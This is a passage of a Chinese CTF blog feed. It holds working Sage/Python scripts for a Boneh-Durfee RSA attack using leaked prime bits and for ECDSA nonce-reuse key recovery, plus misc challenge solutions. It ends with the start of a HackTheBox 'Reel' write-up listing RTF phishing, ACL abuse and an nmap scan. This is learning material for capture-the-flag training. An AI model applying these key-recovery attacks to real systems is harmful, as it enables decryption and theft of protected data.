helpful_only:</span><br><span class="line">        <span class="comment">#  #自动删除</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 重置维度</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查向量是否有帮助</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查行列式是否正确界定</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;在格中寻找线性无关向量&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 对于i and j, 构造两个多项式</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 结果</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># 随机生成数据</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        e = <span class="number">28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771</span></span><br><span class="line">        c = <span class="number">22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302</span></span><br><span class="line">        hint1 = <span class="number">654543761191063613807</span>  <span class="comment"># p高位</span></span><br><span class="line">        hint2 = <span class="number">819778612327847774041</span>  <span class="comment"># q高位</span></span><br><span class="line"><span class="comment">#         print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 解密指数d的指数( 最大0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># 格大小（越大越好/越慢）</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># 来自 Herrmann 和 May 的优化</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># 如果 p、 q 大小相同，则正确</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#构建的方程</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== 核对数据 ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;p的高比特为：&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;q的高比特为：&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180807684-1768989984.png" alt="image-20241030180802109"></p><p>跑第二个脚本，得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180811902-786743954.png" alt="image-20241030180806277"></p><p>wdflag{31998a91-fd51-4df2-864e-73c122786868}</p><h2 id="CRYPTO02-1"><a href="#CRYPTO02-1" class="headerlink" title="CRYPTO02"></a>CRYPTO02</h2><p>下载附件，打开代码，问豆包</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180817943-2031923977.png" alt="image-20241030180812378"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dA</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的参数</span></span><br><span class="line">r1 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">r2 = <span class="number">66378485426889535028763915423685212583706810153195012097516816885575964878246</span></span><br><span class="line">s1 = <span class="number">73636354334739290806716081380360143742414582638332132893041295586890856253300</span></span><br><span class="line">s2 = <span class="number">64320109990895398581134015047131652648423777800538748939578192006599226954034</span></span><br><span class="line">z1 = <span class="number">35311306706233977395060423051262119784421232920823462737043282589337379493964</span></span><br><span class="line">z2 = <span class="number">101807556569342254666094290602497540565936025601030395061064067677254735341454</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据椭圆曲线签名的恢复公式</span></span><br><span class="line"><span class="comment"># s1 * k - z1 = r1 * dA (mod n)</span></span><br><span class="line"><span class="comment"># s2 * k - z2 = r2 * dA (mod n)</span></span><br><span class="line"><span class="comment"># 由于r1 = r2，可以通过联立方程求解dA</span></span><br><span class="line">k = gmpy2.invert(s1 - s2, n) * (z1 - z2) % n</span><br><span class="line">dA = gmpy2.invert(r1, n) * (s1 * k - z1) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用恢复的dA生成AES密钥</span></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密后的flag十六进制字符串</span></span><br><span class="line">encrypted_flag_hex = <span class="string">&#x27;3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b&#x27;</span></span><br><span class="line">encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取IV和密文</span></span><br><span class="line">iv = encrypted_flag_bytes[:AES.block_size]</span><br><span class="line">ciphertext = encrypted_flag_bytes[AES.block_size:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建AES解密对象</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="comment"># 去除填充</span></span><br><span class="line">plaintext = unpad(decrypted_data, AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对替换加密的逆过程（victory_encrypt的逆）</span></span><br><span class="line">victory_key = <span class="string">&quot;WANGDINGCUP&quot;</span></span><br><span class="line">key_length = <span class="built_in">len</span>(victory_key)</span><br><span class="line">decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext.decode().upper()):</span><br><span class="line">    <span class="keyword">if</span> char.isalpha():</span><br><span class="line">        shift = <span class="built_in">ord</span>(victory_key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift + <span class="number">26</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        decrypted_text += decrypted_char</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decrypted_text += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure><p>运行后成功获取到flag，要转小写</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180832848-1086515924.png" alt="image-20241030180826831"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180840444-116028875.png" alt="image-20241030180834674"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="MISC01"><a href="#MISC01" class="headerlink" title="MISC01"></a>MISC01</h2><p>下载附件看题目描述</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180845157-545941591.png" alt="image-20241030180839581"></p><p>拿wireshark看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180857245-111451848.png" alt="image-20241030180851376"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180902131-690201118.png" alt="image-20241030180856447"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180906714-779293795.png" alt="image-20241030180900987"></p><p><strong>md5加密</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180910546-2006475635.png" alt="image-20241030180905063"></p><p>最后得到flag</p><p>wdflag{bd9bfee6c7303048dab68cfa6a14b5e7}</p><h2 id="MISC03"><a href="#MISC03" class="headerlink" title="MISC03"></a>MISC03</h2><p>找攻击IP</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180915751-1519011757.png" alt="image-20241030180909859"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180923878-1406315282.png" alt="image-20241030180917812"></p><p>攻击IP为：39.168.5.60</p><h2 id="MISC04"><a href="#MISC04" class="headerlink" title="MISC04"></a>MISC04</h2><p>给了一个这个抽象图片，蓝底红线，凭直觉一个是需要还原成二维码的形式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180936378-958370206.png" alt="image-20241030180930356"></p><p>根据题干，他是有一个图像加密算法，需要把这个红线还原重组成二维码，搜索一个是这个Peano曲线</p><p>最终找到了一个irisctf的一道赛题The Peano Scramble</p><p><a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/">https://almostgph.github.io/2024/01/08/IrisCTF2024/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peano</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        in_lst = peano(n - <span class="number">1</span>)</span><br><span class="line">        lst = in_lst.copy()</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px,py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">order = peano(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&quot;./1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">block_width = width <span class="comment"># // 3</span></span><br><span class="line">block_height = height <span class="comment"># // 3</span></span><br><span class="line"></span><br><span class="line">new_image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, (x, y) <span class="keyword">in</span> tqdm(<span class="built_in">enumerate</span>(order)):</span><br><span class="line">    <span class="comment"># 根据列表顺序获取新的坐标</span></span><br><span class="line">    new_x, new_y = i % width, i // width</span><br><span class="line">    <span class="comment"># 获取原图像素</span></span><br><span class="line">    pixel = img.getpixel((x, height - <span class="number">1</span> - y))</span><br><span class="line">    <span class="comment"># 在新图像中放置像素</span></span><br><span class="line">    new_image.putpixel((new_x, new_y), pixel)</span><br><span class="line"></span><br><span class="line">new_image.save(<span class="string">&quot;rearranged_image.jpg&quot;</span>) </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180947540-1228530137.png" alt="image-20241030180941362"></p><p>扫码即可</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Reel</title>
      <link href="/posts/4097f734.html"/>
      <url>/posts/4097f734.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.77</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>RTF钓鱼</li><li>ACL滥用-user-WriteOwner权限</li><li>ACL滥用-group-WriteDacl权限</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.10.77</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 13:44 CST</span><br><span class="line">Nmap scan report for 10.10.10.77</span><br><span class="line">Host is up (0.76s latency).</span><br><span class="line">Not shown: 65527 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft 